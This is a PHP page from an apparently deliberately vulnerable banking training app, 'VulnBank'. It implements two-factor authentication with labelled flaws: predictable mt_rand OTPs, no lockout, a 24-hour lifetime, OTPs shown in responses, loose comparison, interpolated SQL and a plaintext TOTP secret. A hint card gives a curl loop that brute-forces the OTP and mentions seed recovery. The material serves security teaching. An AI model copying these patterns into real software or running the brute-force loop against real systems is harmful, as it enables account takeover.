<?php
// ============================================================
//  VulnBank – Two-Factor Authentication (Broken)
//  CWE-330: Predictable OTP via mt_rand() — weak PRNG
//  CWE-307: No rate limiting on OTP guesses (brute-forceable)
//  CWE-262: OTP valid for 24 hours (excessive lifetime)
//  CWE-640: OTP sent in response body (demo), not just by SMS
// ============================================================
require_once 'db.php';
require '_header.php';
if (!isset($_SESSION['user_id'])) { header('Location: index.php'); exit; }

$uid = (int)$_SESSION['user_id'];
$me  = db()->query("SELECT * FROM users WHERE id = $uid")->fetch();
$msg = $error = '';

// Current "pending OTP" stored in session (insecure — should be server-side only)
// A02: OTP in session accessible via session fixation or PHP session file read
if (!isset($_SESSION['otp'])) {
    $_SESSION['otp']         = null;
    $_SESSION['otp_expires'] = null;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = $_POST['action'] ?? '';

    // ── Generate OTP ──────────────────────────────────────────
    if ($action === 'generate') {
        // CWE-330: mt_rand() — NOT cryptographically secure
        // PHP_MT_SEED can recover the seed from 2 observed outputs
        // Random space: only 6 digits (0-999999) = 1M possibilities
        $otp = str_pad(mt_rand(0, 999999), 6, '0', STR_PAD_LEFT);

        // CWE-262: Extremely long OTP lifetime
        $_SESSION['otp']         = $otp;
        $_SESSION['otp_expires'] = time() + 86400; // 24 HOURS — should be 30-60 seconds

        // CWE-640: OTP revealed in response (should only be sent via SMS/email)
        $msg = "OTP generated: <strong><code>$otp</code></strong> (valid 24h)<br>
                <small class='text-warning'>⚠ CWE-640: OTP shown in UI — attacker with XSS reads it directly</small>";
    }

    // ── Verify OTP ────────────────────────────────────────────
    if ($action === 'verify') {
        $input_otp = $_POST['otp'] ?? '';

        // CWE-307: No attempt counter, no lockout, no delay
        // Attacker can try all 1,000,000 combinations in seconds
        if (!$_SESSION['otp']) {
            $error = 'No OTP generated yet.';
        } elseif (time() > ($_SESSION['otp_expires'] ?? 0)) {
            $error = 'OTP expired.';
        } elseif ($input_otp == $_SESSION['otp']) {  // CWE-697: loose comparison again
            $_SESSION['2fa_verified'] = true;
            unset($_SESSION['otp'], $_SESSION['otp_expires']);
            $msg = '✅ 2FA verified! Session elevated.';
        } else {
            // CWE-307: No failed attempt tracking — brute-force away
            $error = 'Wrong OTP. Try again.'; // A09: not logged
        }
    }

    // ── Enable TOTP (stores secret in plaintext) ──────────────
    if ($action === 'enable_totp') {
        // CWE-330: "secret" is just a random string, not cryptographic
        $secret = base64_encode(mt_rand() . mt_rand()); // very weak
        db()->exec("UPDATE users SET totp_secret='$secret', totp_enabled=1 WHERE id=$uid");
        $me['totp_secret']  = $secret;
        $me['totp_enabled'] = 1;
        $msg = "TOTP enabled. Secret (stored in plaintext in DB): <code>$secret</code>";
    }
}

// Brute-force range — if we know the OTP was generated ~now, only need to try
// all mt_rand values for a given seed window
$current_otp = $_SESSION['otp'] ?? null;
?>

<div class="row justify-content-center">
  <div class="col-md-7">
    <div class="alert-vuln">
      ⚠️ <span class="badge-vuln">CWE-330 Weak PRNG</span>
      <span class="badge-vuln">CWE-307 No lockout</span>
      <span class="badge-vuln">CWE-262 24h OTP lifetime</span>
      <span class="badge-vuln">CWE-640 OTP in response</span>
    </div>

    <div class="card shadow mb-3">
      <div class="card-header">Two-Factor Authentication</div>
      <div class="card-body">
        <?php if ($msg):   ?><div class="alert alert-info"><?= $msg ?></div><?php endif; ?>
        <?php if ($error): ?><div class="alert alert-danger"><?= $error ?></div><?php endif; ?>

        <div class="mb-2 p-2 bg-light rounded" style="font-size:.85rem">
          2FA status: <?= $_SESSION['2fa_verified'] ?? false ? '<span class="text-success">✅ Verified</span>' : '<span class="text-danger">❌ Not verified</span>' ?>
          | OTP in session: <code><?= $current_otp ?? 'none' ?></code>
        </div>

        <form method="POST" class="mb-3">
          <input type="hidden" name="action" value="generate">
          <button class="btn btn-warning">Generate OTP (mt_rand)</button>
        </form>

        <form method="POST">
          <input type="hidden" name="action" value="verify">
          <div class="input-group mb-2">
            <input type="text" name="otp" class="form-control" maxlength="6"
                   placeholder="Enter 6-digit OTP">
            <button class="btn btn-primary">Verify OTP</button>
          </div>
          <small class="vuln-label">No rate limiting — can brute-force all 1,000,000 combinations</small>
        </form>
      </div>
    </div>

    <div class="card shadow mb-3">
      <div class="card-header">TOTP Setup (plaintext secret)</div>
      <div class="card-body">
        <form method="POST">
          <input type="hidden" name="action" value="enable_totp">
          <button class="btn btn-outline-secondary btn-sm">Enable TOTP (weak secret)</button>
        </form>
        <?php if ($me['totp_enabled']): ?>
        <p class="mt-2 mb-0" style="font-size:.82rem">
          TOTP secret in DB (plaintext): <code><?= htmlspecialchars($me['totp_secret']) ?></code><br>
          <span class="text-muted">Anyone with DB access can generate all future TOTP codes.</span>
        </p>
        <?php endif; ?>
      </div>
    </div>

    <div class="card hint-card shadow-sm">
      <div class="card-body" style="font-size:.8rem">
        <strong>Brute-force OTP (curl loop):</strong><br>
        <pre class="bg-dark text-light p-2 rounded mt-1" style="font-size:.75rem">for otp in $(seq -w 0 999999); do
  r=$(curl -s -X POST http://localhost:8080/2fa.php \
    -b "PHPSESSID=TARGET_SESSION" \
    -d "action=verify&otp=$otp")
  echo "$r" | grep -q "verified" && echo "OTP: $otp" && break
done</pre>
        <strong>PRNG seed recovery:</strong> Observe 2 OTP values → run
        <code>php_mt_seed</code> to recover seed → predict all future OTPs.<br><br>
        <strong>Timing:</strong> Each curl request takes ~5ms → 1,000,000 guesses ≈ 83 minutes.
        No lockout means this completes successfully.
      </div>
    </div>
  </div>
</div>

<?php require '_footer.php'; ?>
